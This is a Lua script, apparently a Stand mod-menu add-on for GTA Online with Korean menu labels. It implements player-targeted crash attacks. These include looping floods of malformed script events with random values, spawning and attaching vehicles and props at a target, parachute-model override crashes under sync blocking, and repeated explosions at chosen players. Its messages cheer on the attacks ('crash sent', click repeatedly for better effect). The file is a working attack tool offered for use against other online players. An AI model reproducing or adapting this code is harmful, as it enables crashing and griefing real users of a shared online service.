        ENTITY.ATTACH_ENTITY_TO_ENTITY(a3, TargetPlayerPed, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(a4, TargetPlayerPed, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(a5, TargetPlayerPed, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(a6, TargetPlayerPed, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(a7, TargetPlayerPed, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(a8, TargetPlayerPed, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(a9, TargetPlayerPed, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(a10, TargetPlayerPed, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(a11, TargetPlayerPed, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(a12, TargetPlayerPed, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(a13, TargetPlayerPed, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(a14, TargetPlayerPed, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(a15, TargetPlayerPed, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        util.yield(100)
        entities.delete_by_handle(a2)
        entities.delete_by_handle(a3)
        entities.delete_by_handle(a4)
        entities.delete_by_handle(a5)
        entities.delete_by_handle(a6)
        entities.delete_by_handle(a7)
        entities.delete_by_handle(a8)
        entities.delete_by_handle(a9)
        entities.delete_by_handle(a10)
        entities.delete_by_handle(a11)
        entities.delete_by_handle(a12)
        entities.delete_by_handle(a13)
        entities.delete_by_handle(a14)
        entities.delete_by_handle(a15)
        entities.delete_by_handle(a1)
    end)
    menu.toggle(PlayerAttev, "Event 스팸", {}, "", function(Toggle)
        Looop = Toggle
        while Looop do
            local int_min = -2147483647
            local int_max = 2147483647
            for i = 1, 150 do
                util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
            end
            util.yield(100)
            util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
            util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
            util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
            util.trigger_script_event(1 << pid,{1228916411, pid})
            util.trigger_script_event(1 << pid,{962740265, pid,  95398, 98426, -24591, 47901, -64814})
            util.trigger_script_event(1 << pid,{962740265, pid, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            util.trigger_script_event(1 << pid,{-1386010354, pid,  2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            util.trigger_script_event(1 << pid,{-1386010354, pid, 2147483647, 2147483647, -788905164})
            util.trigger_script_event(1 << pid,{677240627, pid,  -1774405356})
            send_script_event(801199324, pid, {pid, 1})
            send_script_event(869796886, pid, {pid, 1})
            send_script_event(801199324, pid, {pid, 1})
            send_script_event(869796886, pid, {pid, 1})
            send_script_event(1114091621, pid, {pid, 1})
			send_script_event(1859990871, pid, {pid, 1})
            send_script_event(1114091621, pid, {pid, 0})
			send_script_event(2033772643, pid, {pid, 0})
            send_script_event(-621279188, pid, {pid, 1})
            send_script_event(-393294520, pid, {pid, 2147483647, 2147483647, 2147483647, 1, 1})	
        end
        while not Looop do
            return
        end
    end)
    menu.action(PlayerAttev, "Event 크래쉬", {}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 150 do
            util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        end
        util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        end
        menu.trigger_commands("givesh " .. players.get_name(pid))
        util.yield(100)
        util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
    end)
    menu.action(PlayerAtt, "차량 크래쉬", {}, "주변에 있는 플레이어들이 모두 튕깁니다.", function()
        util.toast("차량 크래쉬를 보냈어요 !\n\n더 나은 성능을위해 연타해보시는건 어때요 ?")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
		SpawnedDune1 = CreateVehicle("-1661854193", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune1, true)
		SpawnedDune2 = CreateVehicle("-1661854193", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune2, true)
		SpawnedBarracks1 = CreateVehicle("-823509173", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks1, true)
		SpawnedBarracks2 = CreateVehicle("-823509173", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks2, true)
		SpawnedTowtruck = CreateVehicle("-442313018", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedTowtruck, true)
		SpawnedBarracks31 = CreateVehicle("630371791", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks31, true)
		SpawnedBarracks32 = CreateVehicle("630371791", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks32, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks31, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks32, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        for i = 0, 100 do
            TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SpawnedTowtruck, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(SpawnedTowtruck)
        entities.delete_by_handle(SpawnedDune1)
        entities.delete_by_handle(SpawnedDune2)
        entities.delete_by_handle(SpawnedBarracks31)
        entities.delete_by_handle(SpawnedBarracks32)
        entities.delete_by_handle(SpawnedBarracks1)
        entities.delete_by_handle(SpawnedBarracks2)
    end)
    so = menu.action(PlayerAtt, "일회용 IA 크래쉬", {}, "셀프크래쉬 대마왕 :)", function()
        menu.show_warning(so, CLICK_MENU, "두번 이상 사용하면 셀프크래쉬를 유발합니다 :(", function()
         util.toast("이제 사용하지 마세요 :)")
         menu.trigger_commands("anticrashcam on")
         menu.trigger_commands("screenshot on")
		 local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		 local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
         local rr = CreateObject(-1364166376, TargetPlayerPos)
         ENTITY.ATTACH_ENTITY_TO_ENTITY(rr, rr, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, true, false, 0, true)
         util.yield(1000)
         entities.delete_by_handle(rr)
         menu.trigger_commands("screenshot off")
         menu.trigger_commands("anticrashcam off")
        end)
    end)
    menu.action(PlayerAttpr, "Prop 크래쉬 1", {}, "", function()
        util.toast("Prop 크래쉬를 1 보냈어요 :)")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_1 = CreateObject(0x66F34017, TargetPlayerPos)
        local Object_2 = CreateObject(0xB69AD9F8, TargetPlayerPos)
        local Object_3 = CreateObject(0xDE1807BB, TargetPlayerPos)
        local Object_4 = CreateObject(0x68E49D4D, TargetPlayerPos)
        local Object_5 = CreateObject(0x1705D85C, TargetPlayerPos)
        local Object_6 = CreateObject(0x675D244E, TargetPlayerPos)
        local Object_7 = CreateObject(0x799B48CA, TargetPlayerPos)
        local Object_8 = CreateObject(0xC4C9551E, TargetPlayerPos)
        local Object_9 = CreateObject(0x1AD51F27, TargetPlayerPos)
        local Object_10 = CreateObject(0xC883E74F, TargetPlayerPos)
        local Object_11 = CreateObject(0x1AFA6A0A, TargetPlayerPos)
        local Object_12 = CreateObject(0xD75E01A6, TargetPlayerPos)
        local Object_14 = CreateObject(3613262246, TargetPlayerPos)
        local Object_15 = CreateObject(452618762, TargetPlayerPos)
        local Object_16 = CreateObject(-1705943745, TargetPlayerPos)
        local Object_17 = CreateObject(-1173932531, TargetPlayerPos)
        util.yield(1000)
        entities.delete_by_handle(Object_1)
        entities.delete_by_handle(Object_2)
        entities.delete_by_handle(Object_3)
        entities.delete_by_handle(Object_4)
        entities.delete_by_handle(Object_5)
        entities.delete_by_handle(Object_6)
        entities.delete_by_handle(Object_7)
        entities.delete_by_handle(Object_8)
        entities.delete_by_handle(Object_9)
        entities.delete_by_handle(Object_10)
        entities.delete_by_handle(Object_11)
        entities.delete_by_handle(Object_12)
        entities.delete_by_handle(Object_14)
        entities.delete_by_handle(Object_15)
        entities.delete_by_handle(Object_16)
        entities.delete_by_handle(Object_17)
    end)
    menu.action(PlayerAttpr, "Prop 크래쉬 2", {}, "", function()
        util.toast("Prop 크래쉬를 2 보냈어요 :)")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza1 = CreateObject(0x7367D224, TargetPlayerPos)
        local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
        local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
        local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
        local Object_pizza5 = CreateObject(0xFBF7D21F, TargetPlayerPos)
        local Object_pizza6 = CreateObject(3613262246, TargetPlayerPos)
        for i = 0, 100 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza5, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza6, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(Object_pizza1)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza3)
        entities.delete_by_handle(Object_pizza4)
        entities.delete_by_handle(Object_pizza5)
        entities.delete_by_handle(Object_pizza6)
    end)
    menu.action(PlayerAttPh, "낙하산 크래쉬 1", {}, "Jinxscript", function()
        util.toast("낙하산 팩 크래쉬 1 을 보냈어요 !\n\n프라이버시를 위해 잠시 화면을 가릴게요 :)")
        local user = players.user_ped()
        local model = util.joaat("h4_prop_bush_mang_ad")
        local pos = players.get_position(pid)
        local oldPos = players.get_position(players.user())
        BlockSyncs(pid, function() 
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            menu.trigger_commands("screenshot on")
            menu.trigger_commands("anticrashcamera on")
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 31, 0, 0) 
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2000)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT) 
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            menu.trigger_commands("screenshot off")
            menu.trigger_commands("anticrashcamera off")
            util.toast(">> 낙하산 팩 크래쉬 1\n\n이제 눈을 뜨셔도 좋아요 !")
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    menu.action(PlayerAttPh, "낙하산 크래쉬 2", {}, "Jinxscript", function()
        util.toast("낙하산 팩 크래쉬 2 를 보냈어요 !\n\n프라이버시를 위해 잠시 화면을 가릴게요 :)")
        menu.trigger_commands("screenshot on")
        menu.trigger_commands("anticrashcamera on")
        local user = players.user()
        local user_ped = players.user_ped()
        local pos = players.get_position(user)
        local oldPos = players.get_position(players.user())
        BlockSyncs(pid, function() 
            util.yield(100)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
            util.yield()
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
            util.yield(250)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            util.yield(1000)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            util.toast(">> 낙하산 크래쉬 2\n\n이제 눈을 뜨셔도 좋아요 !")
            menu.trigger_commands("screenshot off")
            menu.trigger_commands("anticrashcamera off")
        end)
    end)
    menu.action(PlayerAttPh, "낙하산 크래쉬 3", {}, "개발중입니다. 오류가 뜨며 작동하지 않습니다.", function()
        util.toast("개발중입니다. 작동하지 않습니다")
        local mdl = util.joaat("apa_mp_apa_yacht")
        local user = players.user_ped()
        BlockSyncs(pid, function()
            local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
            PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
            PLAYER._SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
            util.yield(50)
            local pos = players.get_position(pid)
            pos.z += 300
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos, false, false, false)
            repeat
                util.yield()
            until PED.GET_PED_PARACHUTE_STATE(user) == 0
            PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
            util.yield(50)
            TASK.CLEAR_PED_TASKS(user)
            util.yield(50)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
            repeat
                util.yield()
            until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
            pcall(TASK.CLEAR_PED_TASKS_IMMEDIATELY, user)
            PLAYER._CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
            pcall(ENTITY.SET_ENTITY_COORDS, user, old_pos, false, false)
        end)
    end)
    menu.action(PlayerAtt, "Task Temp 크래쉬", {}, "상대방이 자동차에 탐승해있어야 합니다.", function()
        util.toast("Task Temp 크래쉬를 전송했어요 !\n\n상대방이 탑승물에 탑승해있는건 맞겠죠 :?")
        local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local TPV = PED.GET_VEHICLE_PED_IS_IN(TPP,false)
        TASK.TASK_VEHICLE_TEMP_ACTION(TPP, TPV, 18, 5000)
    end)
    menu.action(PlayerAttmo, "Model 크래쉬 1", {}, "", function()
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local selfped = PLAYER.PLAYER_PED_ID()
        request_model_load(util.joaat("cs_beverly"))
        request_model_load(util.joaat("cs_fabien"))
        request_model_load(util.joaat("cs_manuel"))
        request_model_load(util.joaat("cs_taostranslator"))
        request_model_load(util.joaat("cs_taostranslator2"))
        request_model_load(util.joaat("cs_tenniscoach"))
        request_model_load(util.joaat("cs_wade"))
        local PED1 = entities.create_ped(26,util.joaat("cs_beverly"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED1, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED1,-270015777,80,true,true)
        FIRE.ADD_OWNED_EXPLOSION(selfped, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        entities.delete_by_handle(PED1)
        local PED2 = entities.create_ped(26,util.joaat("cs_fabien"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED2, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED2,-270015777,80,true,true)
        FIRE.ADD_OWNED_EXPLOSION(selfped, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        entities.delete_by_handle(PED2)
        local PED3 = entities.create_ped(26,util.joaat("cs_manuel"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED3, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED3,-270015777,80,true,true)
        FIRE.ADD_OWNED_EXPLOSION(selfped, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        entities.delete_by_handle(PED3)
        local PED4 = entities.create_ped(26,util.joaat("cs_taostranslator"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED4, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED4,-270015777,80,true,true)
        FIRE.ADD_OWNED_EXPLOSION(selfped, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        entities.delete_by_handle(PED4)
        local PED5 = entities.create_ped(26,util.joaat("cs_taostranslator2"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED5, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED5,-270015777,80,true,true)
        FIRE.ADD_OWNED_EXPLOSION(selfped, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        local PED6 = entities.create_ped(26,util.joaat("cs_tenniscoach"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED6, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED6,-270015777,80,true,true)
        FIRE.ADD_OWNED_EXPLOSION(selfped, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        local PED7 = entities.create_ped(26,util.joaat("cs_wade"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED7, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED7,-270015777,80,true,true)
        FIRE.ADD_OWNED_EXPLOSION(selfped, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        util.toast(">> Model 크래쉬 1\n\n모두 끝났어요 :)") 
    end)
    menu.action(PlayerAttmo, "Model 크래쉬 2", {}, "", function()
        local mdl = 0x431D501C
        request_model_load(mdl)
        BlockSyncs(pid, function()
         local pos = players.get_position(pid)
         util.yield(100)
         local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
         ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
         local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
         WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('weapon_grenade'), 9999, true, true) --호밍 weapon_hominglauncher
         local obj
         repeat
             obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
         until obj ~= 0 or util.yield()
         ENTITY.DETACH_ENTITY(obj, true, true) 
         util.yield(1500)
         FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
         entities.delete_by_handle(ped1)
         util.toast(">> Model 크래쉬 2\n\n모두 끝났어요 :)")
         util.yield(1000)
        end)
    end)
    menu.toggle(PlayerAtt, "Prop 반복 크래쉬", {}, "", function(Toggle)
        Looop = Toggle
        while Looop do
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            local Object_1 = CreateObject(0x66F34017, TargetPlayerPos)
            local Object_2 = CreateObject(0xB69AD9F8, TargetPlayerPos)
            local Object_3 = CreateObject(0xDE1807BB, TargetPlayerPos)
            local Object_4 = CreateObject(0x68E49D4D, TargetPlayerPos)
            local Object_5 = CreateObject(0x1705D85C, TargetPlayerPos)
            local Object_6 = CreateObject(0x675D244E, TargetPlayerPos)
            local Object_7 = CreateObject(0x799B48CA, TargetPlayerPos)
            local Object_8 = CreateObject(0xC4C9551E, TargetPlayerPos)
            local Object_9 = CreateObject(0x1AD51F27, TargetPlayerPos)
            local Object_10 = CreateObject(0xC883E74F, TargetPlayerPos)
            local Object_11 = CreateObject(0x1AFA6A0A, TargetPlayerPos)
            local Object_12 = CreateObject(0xD75E01A6, TargetPlayerPos)
            local Object_14 = CreateObject(3613262246, TargetPlayerPos)
            util.yield(1)
            entities.delete_by_handle(Object_1)
            entities.delete_by_handle(Object_2)
            entities.delete_by_handle(Object_3)
            entities.delete_by_handle(Object_4)
            entities.delete_by_handle(Object_5)
            entities.delete_by_handle(Object_6)
            entities.delete_by_handle(Object_7)
            entities.delete_by_handle(Object_8)
            entities.delete_by_handle(Object_9)
            entities.delete_by_handle(Object_10)
            entities.delete_by_handle(Object_11)
            entities.delete_by_handle(Object_12)
            entities.delete_by_handle(Object_14)
            util.yield(1)
        end
        while not Looop do
            return
        end
    end)
end 
------------기능구현 끝
players.on_join(function(pid)
    set_up_player_actions(pid)
end)
players.dispatch_on_join()
util.keep_running()
while true do
    
    if launchloop then
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(launchtar)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 70, 1.0, true, false, 0.0)
    end
    if lowfps then
        local coords = ENTITY.GET_ENTITY_COORDS(lowfpstar)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 82, 100.0, true, false, 0.0)
    end
    if customexplo then
        local coords = ENTITY.GET_ENTITY_COORDS(customexplosiontar)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], customexplosion, 100.0, true, false, 0.0)
    end
	util.yield()
end
------------기타 함수 및 스탠드 기본함수 설정끝
------------Stand Script By Volume
